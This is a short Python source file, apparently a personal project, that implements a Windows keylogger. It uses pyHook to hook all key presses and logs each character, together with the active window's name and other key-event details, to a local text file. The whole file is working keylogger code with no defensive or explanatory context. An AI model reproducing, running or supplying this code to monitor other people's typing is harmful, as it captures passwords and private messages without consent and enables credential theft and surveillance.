import pyHook, pythoncom, sys, logging
advancedLog="C:\\Bogdan's Folder\\#PROGRAMMING\\WORK\\#PROJECTS\\CODING\\PYTHON PROJECTS\\Keylogger\\Keylogger Advanced 1.0\\advanced_log.txt"

def OnKeyboardEvent(event):
    
    logging.basicConfig(filename=advancedLog, level=logging.DEBUG, format='%(message)s')
    
    logging.log(10,chr(event.Ascii))
    logging.log(10,'MessageName: {}'.format(event.MessageName))
    logging.log(10,'Message: {}'.format(event.Message))
    logging.log(10,'Time: {}'.format(event.Time))
    logging.log(10,'Window: {}'.format(event.Window))
    logging.log(10,'WindowName: {}'.format(event.WindowName))
    logging.log(10,'Ascii: {}'.format(event.Ascii))
    logging.log(10,'Key: {}'.format(event.Key))
    logging.log(10,'KeyID: {}'.format(event.KeyID))
    logging.log(10,'ScanCode: {}'.format(event.ScanCode))
    logging.log(10,'Extended: {}'.format(event.Extended))
    logging.log(10,'Injected: {}'.format(event.Injected))
    logging.log(10,'Alt {}'.format(event.Alt))
    logging.log(10,'Transition {}'.format(event.Transition))
    logging.log(10,'--------------')

    return True

    
hookManager = pyHook.HookManager()
hookManager.KeyDown = OnKeyboardEvent
hookManager.HookKeyboard()
pythoncom.PumpMessages()
